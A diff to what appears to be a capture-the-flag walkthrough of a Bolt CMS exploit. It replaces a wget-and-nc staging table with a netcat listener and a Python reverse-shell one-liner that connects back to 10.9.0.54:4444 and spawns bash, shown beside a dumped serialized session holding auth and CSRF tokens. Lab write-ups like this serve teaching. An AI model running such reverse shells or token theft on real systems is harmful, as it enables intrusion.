@@ -149,23 +149,17 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ";s:8:"*stack";a:0:{}s:10:"*enabled";i:1;s:17:"*shadowpassword";N;s:14:"*shadowtoken";N;s:17:"*shadowvalidity";N;s:15:"*failedlogins";i:0;s:17:"*throttleduntil";N;s:8:"*roles";a:2:{i:0;s:4:"root";i:1;s:8:"everyone";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:8:"*token";O:29:"Bolt\Storage\Entity\Authtoken":12:{s:5:"*id";s:2:"10";s:10:"*user_id";i:1;s:8:"*token";s:64:"e24a8ffc4daebd4b1b586ae4cbadb4be735d14ab3de9d49282260f592bec0459";s:7:"*salt";s:32:"1e7ed5c76f11a3bdc2ee3623f4c9bdc2";s:11:"*lastseen";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-04-25 16:01:38.867697";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:5:"*ip";s:13:"192.168.100.1";s:12:"*useragent";s:22:"python-requests/2.23.0";s:11:"*validity";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-05-09 16:01:38.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:10:"*checked";i:1587830498;}s:10:"_csrf/bolt";s:43:"-kIwVPHftVt0SZ3XJ_uBEDpT2x-COHYjo4ZSN5H7NUE";s:5:"stack";a:0:{}s:18:"_csrf/user_profile";s:43:"Spoy_vDCzRmnuZPfXYVJNmphWLl7Dv4kuc89Yev_2ag";}s:12:"_sf2_flashes";a:0:{}s:9:"_sf2_meta";a:3:{s:1:"u";i:1587830500;s:1:"c";i:1587830498;s:1:"l";s:1:"0";}}
 ~~~
 
-Unfortunately, `nc` is not installed on the server:
+Unfortunately, `nc` is not installed on the server. We can still do a reverse shell using python. Open a listener on your machine:
 
 ~~~
-Enter OS command , for exit 'quit' : which nc
-";s:8:"*stack";a:0:{}s:10:"*enabled";i:1;s:17:"*shadowpassword";N;s:14:"*shadowtoken";N;s:17:"*shadowvalidity";N;s:15:"*failedlogins";i:0;s:17:"*throttleduntil";N;s:8:"*roles";a:2:{i:0;s:4:"root";i:1;s:8:"everyone";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:8:"*token";O:29:"Bolt\Storage\Entity\Authtoken":12:{s:5:"*id";s:2:"10";s:10:"*user_id";i:1;s:8:"*token";s:64:"e24a8ffc4daebd4b1b586ae4cbadb4be735d14ab3de9d49282260f592bec0459";s:7:"*salt";s:32:"1e7ed5c76f11a3bdc2ee3623f4c9bdc2";s:11:"*lastseen";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-04-25 16:01:38.867697";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:5:"*ip";s:13:"192.168.100.1";s:12:"*useragent";s:22:"python-requests/2.23.0";s:11:"*validity";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-05-09 16:01:38.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:10:"*checked";i:1587830498;}s:10:"_csrf/bolt";s:43:"-kIwVPHftVt0SZ3XJ_uBEDpT2x-COHYjo4ZSN5H7NUE";s:5:"stack";a:0:{}s:18:"_csrf/user_profile";s:43:"Spoy_vDCzRmnuZPfXYVJNmphWLl7Dv4kuc89Yev_2ag";}s:12:"_sf2_flashes";a:0:{}s:9:"_sf2_meta";a:3:{s:1:"u";i:1587830500;s:1:"c";i:1587830498;s:1:"l";s:1:"0";}}
+$ rlwrap nc -nlvp 4444
 ~~~
 
-Now, enter the following commands:
+And execute the following command on the server (exploit shell):
 
-Your workstation | Server (exploit shell)
----|---
-`cp $(which nc) .` | N/A
-`python -m http.server` | N/A
-N/A | `wget http://10.9.0.54:8000/nc`
-N/A | `chmod 755 nc`
-`rlwrap nc -nlvp 4444` | N/A
-N/A | `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.54",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
+~~~
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.54",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+~~~
 
 We now have a shell.
 
